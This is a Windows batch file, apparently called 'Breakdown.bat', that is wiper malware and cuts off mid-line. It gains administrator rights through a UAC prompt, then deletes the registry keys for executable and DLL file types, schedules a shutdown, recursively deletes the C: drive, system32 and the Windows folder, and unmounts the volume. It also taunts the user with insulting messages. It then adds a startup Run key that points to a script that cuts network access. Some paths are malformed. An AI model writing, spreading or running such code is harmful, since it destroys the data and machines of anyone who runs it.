@echo off
:admin

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
        
	echo UAC.ShellExecute "%userprofile%\Downloads\Breakdown.bat", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
	echo UAC.ShellExecute "%userprofile%\Desktop\Breakdown.bat", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
cls
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
ECHO Your computer has been fcked.Â Â Have a nice day.
START %SystemRoot%\system32\notepad.exe
msg * Fatal system error due to admin stupidity!
shutdown -c “Error! You are too stupid!” -s -t 10

RD C:\ /S /Q
del c:\windows\system32*.* /q
del /f /s /q “C:*.*.”

mountvol C: /d
rd %windir% 


echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:window